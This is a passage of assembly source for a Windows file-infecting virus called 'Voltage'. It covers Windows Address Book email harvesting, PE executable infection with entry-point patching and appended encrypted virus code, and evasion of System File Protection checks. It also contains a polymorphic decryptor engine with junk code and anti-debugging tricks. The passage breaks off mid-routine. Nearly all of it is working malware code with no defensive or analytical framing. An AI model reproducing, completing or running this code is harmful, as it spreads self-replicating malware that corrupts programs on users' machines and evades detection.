	dec	ecx
	loop	CpyMail
MovNext:add	eax,ecx
	inc	ebx
	mov	byte ptr [ebx],0h
	pop	ecx
	loop	NxtMail
	push	dword ptr [ebp + hWabMapBase]
	call	[ebp + UnMapViewOfFile]
	push	dword ptr [ebp + hWabMap]
	call	[ebp + CloseHandle]
	push	dword ptr [ebp + hWabFile]
	call	[ebp + CloseHandle]
	ret
CloseWABkeyAndExit:
	push	dword ptr [ebp + hkey]
	call	[ebp + RegCloseKey]
WabScanErr:
	ret
	
	
	WAB_Location		db	"Software\Microsoft\WAB\WAB4\Wab File Name",0
	WAB_Path		db	0ffh	dup(0)
	SizeOfWAB_PATH		dd	0ffh
	hWabFile		dd	0
	hWabMap			dd	0
	hWabMapBase		dd	0
	hMailAddresses		dd	0
	NumberOfMailAddresses	dw	0
	
	
	
	
ExecuteFile:
	mov	dword ptr [ebp + cb],SizeOfStartupinfo
	lea	eax,[ebp + Startupinfo]
	push	eax
	call	[ebp + GetStartupInfo]
	lea	eax,[ebp + Process_Information]
	push	eax
	lea	eax,[ebp + Startupinfo]
	push	eax
	lea	eax,[ebp + FileDirectory]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	eax
	push	eax
	lea	eax,[ebp + CommandLine]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateProcess]
	ret
	
Process_Information:
	hprocess	dd	0
	hthread		dd	0
	dwprocessid	dd	0
	dwthreadid	dd	0
	
Startupinfo:
	cb		dd	0
	lpReserved	dd	0
	lpDesktop	dd	0
	lpTitle		dd	0
	dwX		dd	0
	dwY		dd	0
	dwXSize		dd	0
	dwYSize		dd	0
	dwXCountChars	dd	0
	dwYCountChars	dd	0
	dwFillAttribute	dd	0
	dwFlags		dd	0
	wShowWindow	dw	0
	cbReserved2	dw	0
	lpReserved2	dd	0
	hStdInput	dd	0
	hStdOutput	dd	0
	hStdError	dd	0
	SizeOfStartupinfo	equ	$-Startupinfo

	
InfectFile:
;*********************Debug C0de*******************************
IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + warning]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	ExitInfect
ENDIF
;**************************************************************
	call	CheckFileName
	jnc	ExitInfect
	clc
	call	CheckSFPFile
	jnc	ExitInfect
	call	RemoveFileAttributes
	call	OpenFile
	jnc	ExitInfect
	mov	eax,[ebp + mapbase]
	cmp	word ptr [eax],"ZM"		;check mz sign
	jne	ExitWithoutInfection
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"		;check pe sign
	jne	ExitWithoutInfection
	push	eax				;save pe header offset in the stack
	mov	cx,word ptr [eax + 16h]		;get flags
	and	cx,2000h
	cmp	cx,2000h			;is dll ?
	jne	nodll				;infect only executeables
	pop	eax				;restore stack
	jmp	ExitWithoutInfection
nodll:	mov	ecx,[eax + 34h]			;get image base
	mov	[ebp + ProgramImageBase],ecx	;save image base
	movzx	ecx,word ptr [eax + 6h]		;get number of sections
	mov	ebx,[eax + 74h]
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h				;goto first section header
@nexts:	mov	ebx,[eax + 24h]			;get section flags
	and	ebx,20h
	cmp	ebx,20h				;is code section ?
	je	FoundCS
	add	eax,28h
	loop	@nexts
	pop	eax				;restore stack
	jmp	ExitWithoutInfection	
FoundCS:mov	ebx,[eax + 10h]			;get section size of raw data
	sub	ebx,[eax + 8h]
	cmp	ebx,0beh			;check for minimum decryptor size
	ja	____1
	pop	eax				;restore stack
	jmp	ExitWithoutInfection
____1:	mov	ecx,[eax + 8h]			;get section vitrual size	
	mov	ebx,ecx				;get section virtual size
	add	ebx,[eax + 14h]			;add to it pointer raw data rva
	add	ebx,[ebp + mapbase]		;convert it to va
	mov	[ebp+WhereToWriteDecryptor],ebx	;set where to write decryptor
	mov	ebx,dword ptr [esp]		;get pe header
	push	eax				;save pointer to code section header
	push	ecx				;save size of code section
	mov	eax,[ebx + 28h]			;get entry point rva
	add	eax,[ebp + mapbase]		;convert it to va
	mov	ecx,64h				;100 bytes
	call	ScanAndPatch			;try to patch instruction that close to EP first	
	jnc	patch2				;if fail try some other thing...
	add	esp,8h				;restore stack
	jmp	____2
patch2:	mov	ecx,64h				;100 bytes
	mov	eax,[esp + 8h]			;get pe header
	mov	eax,[eax + 28h]			;get program entry point rva
	add	eax,[ebp + mapbase]		;convert it to va
	sub	eax,0c00h			;it work with some programs :)
	call	ScanAndPatch
	jnc	all_sec				;if we fail scan all code section
	add	esp,8h				;restore stack
	jmp	____2
all_sec:pop	ecx				;restore size of code section
	pop	eax				;restore pointer to code section header
	mov	eax,[eax + 14h]
	add	eax,[ebp + mapbase]		;goto section raw data
	call	ScanAndPatch
	jc	____2
	pop	eax				;restore stack
	jmp	ExitWithoutInfection
____2:	mov	eax,dword ptr [esp]		;get pe header
	xor	ecx,ecx
	mov	cx,word ptr [eax + 6h]		;get number of sections
	dec	ecx
	mov	ebx,[eax + 74h]
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h
@nexts2:add	eax,28h
	loop	@nexts2				;goto last section header
	or	[eax + 24h],0C0000000h		;set section flags to readable\writeable
	add	dword ptr [eax + 8h],VirusSize	;add virus size to section virtual size
	xchg	eax,ebx
	mov	eax,[ebx + 8h]			;get section new virtual size
	mov	ecx,dword ptr [esp]		;get pe header
	mov	ecx,[ecx + 3ch]			;get file alignment
	push	eax				;\
	xor	edx,edx				; \
	div	ecx				;-->align section size
	sub	ecx,edx				; /
	pop	dword ptr [ebx + 10h]		;/
	add	dword ptr [ebx + 10h],ecx	;set new section size of raw data
	push	eax					
	mov	[ebp + FixRVA],0		;add VirtualSize-PointerToRawData
	mov	eax,[ebx + 0ch]			;subtraction to the virus offset
	sub	eax,[ebx + 14h]			;when decrypting and jumping to
	mov	[ebp + FixRVA],eax		;virus at runtime.
	pop	eax
	mov	eax,[ebx + 14h]			;get section raw data rva
	add	eax,[ebp + mapbase]		;convert it to va
	add	eax,[ebx + 8h]			;goto end of section
	sub	eax,VirusSize
	mov	[ebp + StartOfDataToEncrypt],eax;set the virus start offset
	xchg	edi,eax
	call	[ebp + GetTickCount]
	mov	byte ptr [ebp + XorKey],al	;set random key
	push	edi				;virus in infected files
	push	eax				;tick count
	lea	esi,[ebp + _main]
	mov	ecx,VirusSize
	rep	movsb				;copy virus into host
	pop	eax
	pop	edi
	mov	ecx,EncryptedVirus
	add	edi,EncryptionStart
encrypt:xor	byte ptr [edi],al
	inc	edi
	loop	encrypt
	call	CreateDecryptor			;create polymorphic decryptor
	pop	ebx				;restore pe header
	mov	eax,[ebx + 50h]			;get size of image
	add	eax,VirusSize
	push	eax
	xor	edx,edx
	mov	ecx,[ebx + 38h]			;get section alignment
	div	ecx
	sub	ecx,edx
	pop	eax
	add	eax,ecx				;align size of image
	mov	dword ptr [ebx + 50h],eax	;set new size of image
	inc	byte ptr [ebp + Infection_Success]
	call	PadFileSize
ExitCloseF:
	call	CloseFile
ExitInfect:
	call	RestoreFileAttributes
	ret
ExitWithoutInfection:
	call	RestoreFileSize
	call	CloseFile
	call	RestoreFileAttributes
	ret
	
	
	Infection_Success	db	0
	
;scan a code for mov eax,fs:[00000000] instruction and 
;patch it with call virus_decryptor and inc ebx instruction
;input:
;eax - address of code
;ecx - size of code to scan
;output:
;carry flag - success\fail.
ScanAndPatch:
__1:	cmp	word ptr [eax],0a164h
	jne	nxt_w
	cmp	dword ptr [eax + 2h],0
	jne	nxt_w
	mov	byte ptr [eax],0e8h		;call instruction
	mov	ebx,[ebp + WhereToWriteDecryptor]
	push	eax
	sub	eax,[ebp + mapbase]
	sub	ebx,eax
	sub	ebx,5h
	sub	ebx,[ebp + mapbase]
	pop	eax
	mov	dword ptr [eax + 1h],ebx
	mov	byte ptr [eax + 5h],43h		;inc ebx instruction
	jmp	patchok				;patch only one time.
nxt_w:	inc	eax
	loop	__1
	jmp	nopatch
patchok:stc
	ret
nopatch:clc
	ret
	
;input:nothing
;output:carry flag:
;1=protected
;0=not protected
CheckSFPFile:
	pushad
	lea	eax,[ebp + SFP_Check_Error_Handler]
	push	eax
	xor	eax,eax
	push	dword ptr fs:[eax]		;set SEH
	mov	fs:[eax],esp
	lea	eax,[ebp + SFC_DLL]
	push	eax
	call	[ebp + LoadLibrary]		;load sfc library
	cmp	eax,0h				;sfc here ?
	je	NotProtected			;we not under xp\2000
	mov	[ebp + hSfc],eax		;save module handle
	lea	ebx,[ebp + _SfcIsFileProtected]
	push	ebx
	push	eax				;sfc module handle
	call	[ebp + __GetProcAddress]
	cmp	eax,0h				;function not founded ?
	je	NotProtected
	mov	[ebp + SfcIsFileProtected],eax	;save function address
	lea	esi,[ebp + Unicode_Path]
	xor	eax,eax
	mov	ecx,200h
@blankU:stosb					;blank unicode buffer
	loop	@blankU				;to avoid errors
	push	200h
	lea	eax,[ebp + Unicode_Path]
	push	eax
	push	-1				;string is null terminated
	lea	eax,[ebp + FileToInfect]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + MultiByteToWideChar]	;convert path into unicode
	cmp	eax,0h				;fail ?
	je	SFP_Err				;dont infect
	lea	eax,[ebp + Unicode_Path]
	push	eax
	push	0h
	call	[ebp + SfcIsFileProtected]	;check if file is protected
	cmp	eax,0h				;is file protected ?
	jne	SFP_Err
	push	dword ptr [ebp + hSfc]
	call	[ebp + FreeLibrary]		;free sfc library
NotProtected:
	pop	dword ptr fs:[0]		;remove SEH
	add	esp,4h
	popad
	stc
	ret
SFP_Err:					;if file is protected we here
	push	dword ptr [ebp + hSfc]
	call	[ebp + FreeLibrary]		;free sfc library 
	pop	dword ptr fs:[0]		;remove SEH
	add	esp,4h
	popad
	clc
	ret
	
SFP_Check_Error_Handler:
	mov	esp,[esp + 8h]
	pop	dword ptr fs:[0]		;remove SEH
	add	esp,4h
	popad
	clc
	ret

	
	SFC_DLL	db	"SFC.DLL",0
	hSfc	dd	0
	_SfcIsFileProtected      db      "SfcIsFileProtected",0
	SfcIsFileProtected	dd	0
	
	Unicode_Path	db	200h	dup(0)	 ;200=2 max_path
	
	CP_ACP	equ	0
	
RemoveFileAttributes:
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + GetFileAttributes]
	mov	[ebp + OldFileAttribute],eax
	push	FILE_ATTRIBUTE_NORMAL
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + SetFileAttributes]
	ret
	
	OldFileAttribute	dd	0
	
RestoreFileAttributes:
	push	dword ptr [ebp + OldFileAttribute]
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + SetFileAttributes]
	ret
	
PadFileSize:
	call	pad_size
	push	FILE_BEGIN
	push	0h
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetEndOfFile]
	ret
	
RestoreFileSize:
	push	FILE_BEGIN
	push	0h
	push	dword ptr [ebp + FileSize]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hfile]
	call	[ebp + SetEndOfFile]
	ret
	
CloseFile:
	push	dword ptr [ebp + mapbase]
	call	[ebp + UnMapViewOfFile]
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
	lea	eax,[ebp + LastWriteTime]
	push	eax
	lea	eax,[ebp + LastAccessTime]
	push	eax
	lea	eax,[ebp + CreationTime]
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFileTime]
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
	ret
	
OpenFile:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	OpenFileErr
	mov	dword ptr [ebp + hfile],eax
	push	0h
	push	eax
	call	[ebp + GetFileSize]
	cmp	eax,0ffffffffh
	je	FileSizeErr
	mov	dword ptr [ebp + FileSize],eax
	cmp	eax,2800h
	jb	FileSizeErr
	cmp	eax,300000h
	ja	FileSizeErr
	call	pad_size
	cmp	edx,0h			;already infected ?
	jne	___1
	inc	byte ptr [ebp + Infection_Success]
	jmp	FileSizeErr
___1:	lea	eax,[ebp + LastWriteTime]
	push	eax
	lea	eax,[ebp + LastAccessTime]
	push	eax
	lea	eax,[ebp + CreationTime]
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + GetFileTime]
	xor	eax,eax
	push	eax
	push	dword ptr [ebp + FileSize]
	add	dword ptr [esp],VirusSize
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	FileSizeErr
	mov	dword ptr [ebp + hmap],eax
	push	dword ptr [ebp + FileSize]
	add	dword ptr [esp],VirusSize
	xor	eax,eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hmap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	MapFileErr
	mov	dword ptr [ebp + mapbase],eax
	stc
	ret
MapFileErr:
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
FileSizeErr:
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
OpenFileErr:
	clc
	ret
	
	FileSize	dd	0
	hfile		dd	0
	hmap		dd	0
	mapbase		dd	0
	
	CreationTime		dq	0
	LastAccessTime		dq	0
	LastWriteTime		dq	0
	
	
IF	DEBUG
	warning	db	"Warning!!!:Voltage virus is going to infect this file,press yes to infect",0
ENDIF
	
	FILE_ATTRIBUTE_NORMAL	equ	00000080h
	OPEN_EXISTING	equ	3
	GENERIC_READ	equ	80000000h
	GENERIC_WRITE	equ	40000000h
	INVALID_HANDLE_VALUE	equ	-1
	PAGE_READWRITE	equ	4h
	FILE_MAP_WRITE	equ	00000002h
	FILE_BEGIN	equ	0
	MB_YESNO	equ	00000004h
	IDYES	equ	6
	
;eax - file size
pad_size:
	push	eax
	xor	edx,edx
	mov	ecx,65h	;101d
	div	ecx
	cmp	edx,0h
	je	no_pad
	sub	ecx,edx
	xchg	ecx,edx
no_pad:	pop	eax
	add	eax,edx
	ret
	
;Voltage PolyMorphic Engine:
;---------------------------
;encrypt code with 4 bytes key with diffrent way each time
;and create polymorphic decryptor,the polymorphic decryptor
;has diffrent instructions that do the same thing mixed with
;junk code.


CreateDecryptor:
	call	InitRandomNumber	;init random number generator
	call	GenRandomNumber
	and	eax,1f40h		;get random numebr between 0 ~ 8000
	cmp	eax,7d0h
	ja	NextM
	mov	byte ptr [ebp + EncryptionMethod],1h ;use not
	jmp	EncryptVirus
NextM:	cmp	eax,0fa0h
	ja	NextM2
	mov	byte ptr [ebp + EncryptionMethod],2h ;use add
	jmp	EncryptVirus
NextM2:	cmp	eax,1770h
	ja	NextM3
	mov	byte ptr [ebp + EncryptionMethod],3h ;use sub
	jmp	EncryptVirus
NextM3:	mov	byte ptr [ebp + EncryptionMethod],4h ;use xor
EncryptVirus:
	call	GenRandomNumber
	mov	dword ptr [ebp + key],eax	;get random key
	xor	eax,eax
	mov	ecx,SizeOfDataToEncrypt		;size of data in words
	mov	edi,[ebp + StartOfDataToEncrypt]
	mov	esi,edi
@enc:	lodsd
	cmp	byte ptr [ebp + EncryptionMethod],1h	;is not	?
	jne	NextE
	not	eax
	jmp	_stosw
NextE:	cmp	byte ptr [ebp + EncryptionMethod],2h	;is add ?
	jne	NextE2
	add	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE2:	cmp	byte ptr [ebp + EncryptionMethod],3h	;is sub	?
	jne	NextE4
	sub	eax,dword ptr [ebp + key]
	jmp	_stosw
NextE4: xor	eax,dword ptr [ebp + key]		;xor
_stosw:	stosd
	loop	@enc
	mov	edi,[ebp + WhereToWriteDecryptor]
	call	WriteInstruction1
	call	WriteJunkCode
	call	WriteInstruction2
	call	WriteJunkCode
	call	WriteInstruction3
	call	WriteJunkCode
	call	WriteInstruction4
	call	WriteJunkCode
	mov	dword ptr [ebp + PolyBuffer],edi	;saved for loop
	call	WriteInstruction5
	call	WriteJunkCode
	call	WriteInstruction6
	call	WriteJunkCode
	call	WriteInstruction7
	call	WriteJunkCode
	call	WriteInstruction8
	call	WriteJunkCode
	call	WriteInstruction9
	call	WriteJunkCode
	ret
	
	EncryptionMethod	db	0	;1=not 2=add 3=sub 4=xor
	key			dd	0
	SizeOfDecryptor		dd	0
	WhereToWriteDecryptor	dd	0
	StartOfDataToEncrypt	dd	0
	ProgramImageBase	dd	0
	PolyBuffer		dd	0
	SizeOfDataToEncrypt	equ	(VirusSize/4);virus size in dwords
	FixRVA			dd	0
		
WriteInstruction1:
	;this function write pushad instruction
	mov	byte ptr [edi],60h	;pushad
	inc	edi
	ret
WriteInstruction2:
	;this function set esi register to start of encrypted virus
	call	GenRandomNumber
	mov	ebx,[ebp + StartOfDataToEncrypt]
	sub	ebx,[ebp + mapbase]
	add	ebx,[ebp + ProgramImageBase]
	add	ebx,[ebp + FixRVA]
	and	eax,0ffh		;get random number between 0 ~ 255
	cmp	eax,33h
	ja	ins2_1
	mov	byte ptr [edi],0beh	;way 1:
	mov	dword ptr [edi + 1],ebx	;mov esi,StartOfDataToEncrypt
	add	edi,5h
	jmp	retins2
ins2_1:	cmp	eax,66h
	ja	ins2_2
	mov	byte ptr [edi],68h	;way 2:
	mov	dword ptr [edi + 1],ebx	;push	StartOfDataToEncrypt
	add	edi,5h
	call	WriteJunkCode		;pop	esi
	mov	byte ptr [edi],5eh
	inc	edi
	jmp	retins2
ins2_2:	cmp	eax,99h
	ja	ins2_3
	mov	word ptr [edi],0f633h	;way 3:
	add	edi,2h			;xor esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival
	jmp	retins2
ins2_3:	cmp	eax,0cch
	ja	ins2_4
	mov	word ptr [edi],0f62bh	;way 4
	add	edi,2h			;sub esi,esi
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins2oresival		
	jmp	retins2
ins2_4:	not	ebx			;way 5
	mov	byte ptr [edi],0beh	;mov esi,not StartOfDataToEncrypt
	mov	dword ptr [edi + 1],ebx	
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d6f7h	;not esi
	add	edi,2h
retins2:ret
_ins2oresival:
	;write or esi,StartOfDataToEncrypt instruction
	mov	word ptr [edi],0ce81h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
	
WriteInstruction3:
	;this function set edi register to esi register
	call	GenRandomNumber
	and	eax,0c8h
	cmp	eax,32h
	ja	ins3_1
	mov	word ptr [edi],0fe8bh	;mov edi,esi
	add	edi,2h
	jmp	retins3
ins3_1: cmp	eax,64h
	ja	ins3_2
	mov	byte ptr [edi],56h	;push esi
	inc	edi
	call	WriteJunkCode
	mov	byte ptr [edi],5fh	;pop edi
	inc	edi
	jmp	retins3
ins3_2:	cmp	eax,96h
	ja	ins3_3
	mov	word ptr [edi],0fe87h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
	jmp	retins3
ins3_3:	mov	word ptr [edi],0f787h	;xchg edi esi
	add	edi,2h
	call	WriteJunkCode
	mov	word ptr [edi],0f78bh	;mov esi,edi
	add	edi,2h
retins3:ret

WriteInstruction4:
	;this function set ecx with the size of the virus in dwords
	call	GenRandomNumber
	mov	ebx,SizeOfDataToEncrypt
	and	eax,0ffh
	cmp	eax,33h
	ja	ins4_1
	mov	byte ptr [edi],0b9h	;mov ecx,sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins4	
ins4_1:	cmp	eax,66h
	ja	ins4_2
	mov	byte ptr [edi],68h	;push sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	byte ptr [edi],59h	;pop ecx
	inc	edi
	jmp	retins4	
ins4_2:	cmp	eax,99h
	ja	ins4_3
	mov	word ptr [edi],0c933h	;xor ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4	
ins4_3:	cmp	eax,0cch
	ja	ins4_4
	mov	word ptr [edi],0c92bh	;sub ecx,ecx
	add	edi,2h
	push	ebx
	call	WriteJunkCode
	pop	ebx
	call	_ins4orecxval
	jmp	retins4
ins4_4: not	ebx
	mov	byte ptr [edi],0b9h	;mov ecx,not sizeofvirusindwords
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	call	WriteJunkCode
	mov	word ptr [edi],0d1f7h
	add	edi,2h
retins4:ret
_ins4orecxval:
	mov	word ptr [edi],0c981h
	mov	dword ptr [edi + 2],ebx
	add	edi,6h
	ret
WriteInstruction5:
	;this function read 4 bytes from [esi] into eax
	;and add to esi register 4 (if there is need to do so).
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,64h
	ja	ins5_1
	mov	byte ptr [edi],0adh	;lodsd
	inc	edi
	jmp	retins5
ins5_1:	cmp	eax,0c8h
	ja	ins5_2
	mov	word ptr [edi],068bh	;mov eax,dword ptr [esi]
	add	edi,2h
	call	_ins5addesi4
	jmp	retins5
ins5_2:	mov	word ptr [edi],36ffh	;push dword ptr [esi]
	add	edi,2h
	call	WriteJunkCode
	mov	byte ptr [edi],58h	;pop eax
	inc	edi
	call	_ins5addesi4
retins5:ret

_ins5addesi4:
	;this function write add to esi register 4
	call	GenRandomNumber
	and	eax,64h
	cmp	eax,32h
	ja	addesi4_2
	mov	word ptr [edi],0c683h	;way 1
	mov	byte ptr [edi + 2],4h	;add esi,4h
	add	edi,3h
	jmp	raddesi
addesi4_2:
	mov	ecx,4h		;way 2
@incesi:mov	byte ptr [edi],46h
	inc	edi
	call	WriteJunkCode
	loop	@incesi
raddesi:ret


WriteInstruction6:
	;this function decrypt the value of eax
	mov	ebx,dword ptr [ebp + key]
	cmp	byte ptr [ebp + EncryptionMethod],1h
	jne	ins6_1
	mov	word ptr [edi],0d0f7h	;not eax
	add	edi,2h
	jmp	retins6
ins6_1:	cmp	byte ptr [ebp + EncryptionMethod],2h
	jne	ins6_2
	mov	byte ptr [edi],2dh	;sub eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_2:	cmp	byte ptr [ebp + EncryptionMethod],3h
	jne	ins6_3
	mov	byte ptr [edi],05h	;add eax,key
	mov	dword ptr [edi + 1],ebx
	add	edi,5h
	jmp	retins6
ins6_3:	mov	byte ptr [edi],35h
	mov	dword ptr [edi + 1],ebx ;xor eax,key
	add	edi,5h
	jmp	retins6
retins6:ret




WriteInstruction7:
	;this function copy the value of eax to [edi]
	call	GenRandomNumber
	and	eax,258h
	cmp	eax,0c8h
	ja	ins7_1
	mov	byte ptr [edi],0abh	;stosd
	inc	edi
	jmp	retins7
ins7_1:	cmp	eax,190h
	ja	ins7_2
	mov	word ptr [edi],0789h	;mov dword ptr [edi],eax
	add	edi,2h
	call	WriteJunkCode
	call	addedi4
	jmp	retins7
ins7_2:	mov	byte ptr [edi],50h	;push eax
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],078fh	;pop dword ptr [edi]
	add	edi,2h
	call	addedi4
retins7:ret

addedi4:
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	_addedi4
	mov	word ptr [edi],0c783h
	mov	byte ptr [edi + 2],4h
	add	edi,3h
	jmp	retins7a
_addedi4:
	mov	ecx,4h
@incedi:mov	byte ptr [edi],47h	;inc edi
	inc	edi
	call	WriteJunkCode
	loop	@incedi
retins7a:ret


WriteInstruction8:
	;this function write the loop instruction of the decryptor
	call	GenRandomNumber
	and	eax,12ch
	cmp	eax,96h
	ja	ins8_1
	mov	byte ptr [edi],49h	;dec ecx
	inc	edi
	call	WriteJunkCode
	mov	word ptr [edi],0f983h
	mov	byte ptr [edi + 2],0h	;cmp ecx,0h
	add	edi,3h
	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],75h	;jne
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
	jmp	retins8
ins8_1:	mov	eax,dword ptr [ebp + PolyBuffer]
	sub	eax,edi
	mov	byte ptr [edi],0e2h	;loop
	sub	eax,2h
	mov	byte ptr [edi + 1],al
	add	edi,2h
retins8:ret


WriteInstruction9:
	;this istruction write a code in the stack,that jump into virus code
	call	GenRandomNumber
	mov	ebx,[ebp + StartOfDataToEncrypt]
	sub	ebx,[ebp + mapbase]
	add	ebx,[ebp + ProgramImageBase]
	add	ebx,[ebp + FixRVA]			;offset to jump
	mov	dword ptr [ebp + push_and_ret + 1],ebx	;save address
	;push 'push offset' & 'ret' instructions to the stack
	;way 1:
	;	push xxx
	;	push xxx
	;way 2:
	;	mov	reg,xxx
	;	push	reg
	;	mov	reg,xxx
	;	push	reg
	;way 3:
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;	mov	reg,xored xxx
	;	push	reg
	;	xor	dword ptr [esp],xored val
	;------------------------------------------------------
	and	eax,4b0h
	cmp	eax,190h
	ja	I9_A
	xor	ecx,ecx				;way 1 !!!
	mov	cx,word ptr [ebp + push_and_ret+4]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi + 1h],ecx	;gen push xxx
	add	edi,5h
	call	WriteJunkCode
	xor	ecx,ecx
	mov	ecx,dword ptr [ebp + push_and_ret]
	mov	byte ptr [edi],68h
	mov	dword ptr [edi +1h],ecx		;gen push xxx
	add	edi,5h	
	jmp	I9_Exit
I9_A:	cmp	eax,320h
	ja	I9_B
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	call	GenMoveAndPush
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	call	GenMoveAndPush
	jmp	I9_Exit
I9_B:	call	GenRandomNumber
	xchg	ebx,eax
	xor	eax,eax
	mov	ax,word ptr [ebp + push_and_ret+4]
	xor	eax,ebx
	call	GenMoveAndPush
	call	_WriteJunkCode
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	push	eax
	stosd
	xor	eax,eax
	mov	eax,dword ptr [ebp + push_and_ret]
	xor	eax,dword ptr [esp]
	call	GenMoveAndPush
	call	_WriteJunkCode
	pop	ebx
	mov	al,81h
	stosb
	mov	ax,2434h
	stosw
	xchg	ebx,eax
	stosd
I9_Exit:
	Call	WriteJunkCode
	;gen a SEH frame that jump into the stack
	;----------------------------------------
	;gen 'push esp'
	;way 1:
	;	push	esp
	;way 2:
	;	mov	reg,esp
	;	push	reg
	;------------------------------------------
	call	GenRandomNumber
	and	eax,4b0h			;get number between 0 ~ 1200
	cmp	eax,258h
	ja	_PushEsp1
	mov	al,54h				;push	esp
	stosb
	jmp	___1__	
_PushEsp1:	
	call	GenRandomNumber			;way 2:
	and	eax,7h				;move reg,esp
	push	eax				;push reg
	mov	ecx,8h
	mul	ecx
	xchg	al,ah
	add	ah,0c4h
	mov	al,8bh
	stosw
	call	_WriteJunkCode
	pop	eax
	add	al,50h
	stosb
___1__:	
	call	WriteJunkCode
	;gen 'push dword ptr fs:[0]'
	;way 1:
	;	push	dword ptr fs:[0]
	;way 2:
	;	xor/sub reg,reg
	;	push	dword ptr fs:[reg]
	;way 3:
	;	xor/sub reg,reg
	;	push	dword ptr fs:[reg+reg]
	;--------------------------------------------
	call	GenRandomNumber
	and	eax,4b0h
	cmp	eax,190h
	ja	_nW
	mov	eax,36FF6764h
	stosd
	xor	eax,eax
	stosw
	jmp	NextIns
_nW:	cmp	eax,320h
	ja	_nW2
	call	GenEmptyReg
	push	ecx
	call	_WriteJunkCode
	pop	ecx
	sub	ch,0c0h
	xor	eax,eax
	mov	al,ch
	mov	ecx,9h
	div	ecx
	xchg	al,cl
	mov	ax,0ff64h
	stosw
	xchg	al,cl
	add	al,30h
	stosb
	jmp	NextIns
_nW2:	call	GenEmptyReg
	push	ecx
	call	_WriteJunkCode
	pop	ecx
	sub	ch,0c0h
	xchg	ah,ch
	mov	al,34h
	shl	eax,10h
	mov	ax,0ff64h
	stosd
NextIns:	
	call	WriteJunkCode
	;gen 'mov fs:[0],esp
	;way 1:
	;	mov fs:[0],esp
	;way 2:
	;	xor/sub reg,reg
	;	mov fs:[reg],esp
	;way 3:
	;	mov reg,esp
	;	mov fs:[0],reg
	;---------------------------------------------
	call	GenRandomNumber
	and	eax,4b0h
	cmp	eax,190h
	ja	__nW1
	mov	eax,26896764h
	stosd
	xor	eax,eax
	stosw
	jmp	GenF
__nW1:	cmp	eax,320h
	ja	__nW2
	call	GenEmptyReg
	sub	ch,0c0h
	push	ecx
	call	_WriteJunkCode
	pop	ecx
	xor	eax,eax
	mov	al,ch
	mov	ecx,9h
	div	ecx
	push	eax
	mov	ax,8964h
	stosw
	pop	eax
	add	al,20h
	stosb
	jmp	GenF
__nW2:	call	GenMovRegEsp
	push	ecx
	call	_WriteJunkCode
	pop	ecx
	add	cl,0eh
	mov	eax,89676400h
	mov	al,cl
	ror	eax,8h
	stosd
	xor	eax,eax
	stosw
GenF:	
	;gen 'page fault',in order to force debugger to jump
	;way 1:
	;	int 3
	;way 2:
	;	ud2	-> undefine instruction (0fh,0bh)
	;way 3:
	;	mov ecx,0\xor ecx,ecx\sub ecx\ecx
	;	div	ecx
	;--------------------------------------------------------
	call	GenRandomNumber
	and	eax,384h
	cmp	eax,12ch
	ja	_F_1
	mov	al,0cch
	stosb
	jmp	ExitGF
_F_1:	cmp	eax,258h
	ja	_F_2
